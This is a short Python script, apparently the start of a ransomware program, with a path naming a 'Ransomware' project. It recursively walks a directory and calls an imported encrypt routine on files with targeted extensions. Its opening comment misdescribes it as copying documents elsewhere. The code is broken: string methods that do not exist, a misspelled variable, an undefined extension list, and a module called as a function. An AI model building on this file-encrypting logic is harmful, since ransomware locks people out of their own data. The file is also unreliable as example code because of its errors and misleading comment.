# to copy all of my documents into another location.
from os.path import isdir,isfile,splitext
from os import listdir

import encrypt
import decrypt

def movein(dirpath='/home/ashwin/Documents/projects/Ransomware'):
    for each in listdir(dirpath):
        if each.isdir():
            movein(each)
        elif each.isfile():
            extenstion=splitext(each)
            if extension in encr:
                encrypt()

if __name__ == '__main__':
    movein()